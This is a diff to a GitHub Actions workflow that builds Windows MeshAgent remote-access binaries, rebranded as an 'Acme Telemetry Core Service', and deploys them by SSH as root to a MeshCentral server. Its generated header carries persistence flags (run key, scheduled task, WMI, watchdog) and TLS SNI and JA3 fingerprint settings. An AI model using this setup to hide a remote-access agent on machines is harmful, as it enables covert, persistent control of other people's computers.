@@ -1,4 +1,4 @@
-name: Build and Release Custom MeshAgent
+﻿name: Build and Release Custom MeshAgent
 
 on:
   push:
@@ -15,6 +15,9 @@ on:
         default: 'false'
         type: boolean
 
+permissions:
+  contents: write
+
 env:
   BRANDING_CONFIG: 'ip_only_acme.json'
   MESHCENTRAL_SERVER: 'high.support'
@@ -23,7 +26,6 @@ env:
 jobs:
   build-windows:
     runs-on: windows-latest
-
     strategy:
       matrix:
         arch: [x64, x86]
@@ -52,18 +54,18 @@ jobs:
 
       - name: Fetch branding configuration
         id: fetch_config
+        shell: pwsh
         run: |
-          # Use branding config from repository root (already committed)
           if (Test-Path "./branding_config.json") {
             Write-Host "Using branding config from repository"
             Get-Content "./branding_config.json"
-          } elseif ("${{ secrets.BRANDING_CONFIG_JSON }}" -ne "") {
-            # Use secret if available
+          }
+          elseif ("${{ secrets.BRANDING_CONFIG_JSON }}" -ne "") {
             "${{ secrets.BRANDING_CONFIG_JSON }}" | Out-File -FilePath "./branding_config.json" -Encoding utf8
             Write-Host "Using branding config from secrets"
             Get-Content "./branding_config.json"
-          } else {
-            # Fallback: create minimal config
+          }
+          else {
             Write-Host "Creating default branding config"
             @"
 {
@@ -77,41 +79,34 @@ jobs:
     "logPath": "C:/ProgramData/Acme/TelemetryCore/logs"
   },
   "network": {
-          "primaryEndpoint": "wss://high.support:443/agent.ashx",
+    "primaryEndpoint": "wss://high.support:443/agent.ashx",
     "userAgent": "AcmeAgent/1.0"
   }
 }
 "@ | Out-File -FilePath "./branding_config.json" -Encoding utf8
             Get-Content "./branding_config.json"
           }
-        shell: pwsh
 
       - name: Generate branding headers
+        shell: pwsh
         run: |
-          # Create Python script to generate branding headers
           $script = @'
-          import json
-          import sys
-
-          def generate_branding_header(config):
-              branding = config.get("branding", {})
-              network = config.get("network", {})
-
-              service_name = branding.get("serviceName", "MeshAgent")
-              display_name = branding.get("displayName", "Mesh Agent Background Service")
-              company_name = branding.get("companyName", "")
-              product_name = branding.get("productName", service_name)
-              description = branding.get("description", display_name)
-              binary_name = branding.get("binaryName", f"{service_name}.exe")
-              log_path = branding.get("logPath", "C:/ProgramData/MeshAgent/logs")
-
-              endpoint = network.get("primaryEndpoint", "")
-              user_agent = network.get("userAgent", "MeshAgent/1.0")
-
-              header = f'''/* Generated file – do not edit. */
+          import json, os
+          cfg = json.load(open("branding_config.json","r"))
+          branding = cfg.get("branding", {})
+          network = cfg.get("network", {})
+          service_name = branding.get("serviceName", "MeshAgent")
+          display_name = branding.get("displayName", "Mesh Agent Background Service")
+          company_name = branding.get("companyName", "")
+          product_name = branding.get("productName", service_name)
+          description = branding.get("description", display_name)
+          binary_name = branding.get("binaryName", f"{service_name}.exe")
+          log_path = branding.get("logPath", "C:/ProgramData/MeshAgent/logs")
+          endpoint = network.get("primaryEndpoint", "")
+          user_agent = network.get("userAgent", "MeshAgent/1.0")
+          header = f'''/* Generated file – do not edit. */
           #ifndef GENERATED_MESHAGENT_BRANDING_H
           #define GENERATED_MESHAGENT_BRANDING_H
-
           #undef MESH_AGENT_SERVICE_FILE
           #define MESH_AGENT_SERVICE_FILE TEXT("{service_name}")
           #undef MESH_AGENT_SERVICE_NAME
@@ -128,58 +123,33 @@ jobs:
           #define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
           #undef MESH_AGENT_LOG_DIRECTORY
           #define MESH_AGENT_LOG_DIRECTORY TEXT("{log_path}")
-
-          /* Optional network hints for future use */
           #define MESH_AGENT_NETWORK_ENDPOINT "{endpoint}"
           #define MESH_AGENT_NETWORK_SNI NULL
           #define MESH_AGENT_NETWORK_USER_AGENT "{user_agent}"
           #define MESH_AGENT_NETWORK_JA3 NULL
-
-          /* Persistence flags */
           #define MESH_AGENT_PERSIST_RUNKEY 0
           #define MESH_AGENT_PERSIST_TASK 0
           #define MESH_AGENT_PERSIST_WMI 0
           #define MESH_AGENT_PERSIST_WATCHDOG 1
-
-          #endif /* GENERATED_MESHAGENT_BRANDING_H */
+          #endif
           '''
-              return header
-
-          if __name__ == "__main__":
-              with open("branding_config.json", "r") as f:
-                  config = json.load(f)
-
-              header_content = generate_branding_header(config)
-
-              # Write to meshcore/generated/
-              import os
-              os.makedirs("meshcore/generated", exist_ok=True)
-              with open("meshcore/generated/meshagent_branding.h", "w") as f:
-                  f.write(header_content)
-
-              print("Generated branding header successfully")
+          os.makedirs("meshcore/generated", exist_ok=True)
+          open("meshcore/generated/meshagent_branding.h", "w").write(header)
+          print("Generated branding header successfully")
           '@
-
           $script | Out-File -FilePath "generate_branding.py" -Encoding utf8
           python generate_branding.py
-        shell: pwsh
 
       - name: Restore NuGet packages
+        shell: pwsh
         run: |
           Write-Host "Restoring NuGet packages for MeshAgent-2022.sln"
           nuget restore MeshAgent-2022.sln
-          if ($LASTEXITCODE -ne 0) {
-            Write-Host "NuGet restore failed with exit code $LASTEXITCODE"
-            exit $LASTEXITCODE
-          }
-        shell: pwsh
 
       - name: Build MeshService (${{ matrix.arch }})
+        shell: pwsh
         run: |
           Write-Host "Building MeshService for ${{ matrix.arch }} platform"
-          Write-Host "Configuration: Release"
-          Write-Host "Platform: ${{ matrix.platform }}"
-
           msbuild MeshAgent-2022.sln `
             /t:MeshService `
             /p:Configuration=Release `
@@ -187,54 +157,25 @@ jobs:
             /p:WindowsTargetPlatformVersion=10.0 `
             /p:PlatformToolset=v143 `
             /m `
-            /v:normal `
+            /v:minimal `
             /fl `
             /flp:logfile=build_${{ matrix.arch }}.log
 
-          if ($LASTEXITCODE -ne 0) {
-            Write-Host "Build failed with exit code $LASTEXITCODE"
-            Write-Host "Build log:"
-            if (Test-Path "build_${{ matrix.arch }}.log") {
-              Get-Content "build_${{ matrix.arch }}.log" -Tail 100
-            }
-            exit $LASTEXITCODE
-          }
-
-          Write-Host "Build completed successfully"
-        shell: pwsh
-
       - name: Locate and rename binary
         id: locate_binary
+        shell: pwsh
         run: |
-          # Find the built executable
           $exePath = Get-ChildItem -Path "." -Recurse -Filter "MeshService.exe" | Where-Object {
             $_.DirectoryName -like "*Release*" -and $_.DirectoryName -like "*${{ matrix.arch }}*"
           } | Select-Object -First 1
-
           if ($exePath) {
-            Write-Host "Found executable: $($exePath.FullName)"
-
-            # Create artifacts directory
-            New-Item -ItemType Directory -Force -Path "./artifacts"
-
-            # Copy and rename
+            New-Item -ItemType Directory -Force -Path "./artifacts" | Out-Null
             Copy-Item $exePath.FullName -Destination "./artifacts/${{ matrix.output_name }}"
-
-            Write-Host "Copied to ./artifacts/${{ matrix.output_name }}"
-
-            # Get file info
-            $fileInfo = Get-Item "./artifacts/${{ matrix.output_name }}"
-            $fileSize = [math]::Round($fileInfo.Length / 1MB, 2)
-            Write-Host "File size: ${fileSize} MB"
-
-            # Set output
             echo "artifact_path=./artifacts/${{ matrix.output_name }}" >> $env:GITHUB_OUTPUT
-            echo "file_size=${fileSize}" >> $env:GITHUB_OUTPUT
           } else {
             Write-Host "ERROR: Could not find built executable"
             exit 1
           }
-        shell: pwsh
 
       - name: Upload build logs (if exists)
         if: always()
@@ -254,7 +195,7 @@ jobs:
 
       - name: Upload to release (on tag)
         if: startsWith(github.ref, 'refs/tags/v')
-        uses: softprops/action-gh-release@v1
+        uses: softprops/action-gh-release@v2
         with:
           files: ./artifacts/${{ matrix.output_name }}
           draft: false
@@ -268,7 +209,6 @@ jobs:
     if: |
       (github.event_name == 'workflow_dispatch' && github.event.inputs.deploy_to_server == 'true') ||
       (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v'))
-
     steps:
       - name: Download artifacts
         uses: actions/download-artifact@v4
@@ -276,6 +216,7 @@ jobs:
           path: ./artifacts
 
       - name: Setup SSH
+        if: ${{ secrets.SSH_PRIVATE_KEY != '' }}
         run: |
           mkdir -p ~/.ssh
           echo "${{ secrets.SSH_PRIVATE_KEY }}" > ~/.ssh/id_rsa
@@ -283,31 +224,22 @@ jobs:
           ssh-keyscan -H ${{ env.MESHCENTRAL_SERVER }} >> ~/.ssh/ssh_known_hosts
 
       - name: Deploy to MeshCentral server
+        if: ${{ secrets.SSH_PRIVATE_KEY != '' }}
         run: |
-          # Upload binaries
           scp ./artifacts/MeshService64.exe/MeshService64.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
           scp ./artifacts/MeshService.exe/MeshService.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
-
-          # Restart MeshCentral
           ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl restart meshcentral"
 
-          echo "Deployed successfully to ${{ env.MESHCENTRAL_SERVER }}"
-
       - name: Verify deployment
+        if: ${{ secrets.SSH_PRIVATE_KEY != '' }}
         run: |
-          # Wait for service to start
           sleep 10
-
-          # Check service status
           ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl status meshcentral --no-pager"
-
-          echo "Deployment verified"
 
   create-release:
     needs: build-windows
     runs-on: ubuntu-latest
     if: startsWith(github.ref, 'refs/tags/v')
-
     steps:
       - name: Download all artifacts
         uses: actions/download-artifact@v4
@@ -318,35 +250,14 @@ jobs:
         run: |
           cat > release_notes.md << 'EOF'
           ## Custom MeshAgent Binaries
-
           This release contains custom-branded MeshAgent binaries:
-
-          - **MeshService64.exe** - 64-bit Windows agent
-          - **MeshService.exe** - 32-bit Windows agent
-
-          ### Branding Configuration
-          - Company: Acme Corp
-          - Service: Acme Telemetry Core Service
-          - Server: wss://high.support:443/agent.ashx
-
-          ### Installation
-          1. Download the appropriate binary for your architecture
-          2. Run as administrator to install the service
-          3. The agent will automatically connect to the MeshCentral server
-
-          ### Notes
-          - Built from commit: ${{ github.sha }}
-          - Build timestamp: $(date -u +"%Y-%m-%d %H:%M:%S UTC")
+          - MeshService64.exe (64-bit)
+          - MeshService.exe (32-bit)
+          Built from commit: ${{ github.sha }}
           EOF
 
-      - name: Display artifact info
-        run: |
-          echo "## Build Artifacts" >> release_notes.md
-          echo "" >> release_notes.md
-          find ./artifacts -type f -name "*.exe" -exec ls -lh {} \; | awk '{print "- " $9 " (" $5 ")"}' >> release_notes.md
-
-      - name: Create GitHub Release
-        uses: softprops/action-gh-release@v1
+      - name: Create GitHub Release (aggregate)
+        uses: softprops/action-gh-release@v2
         with:
           files: ./artifacts/**/*.exe
           body_path: release_notes.md
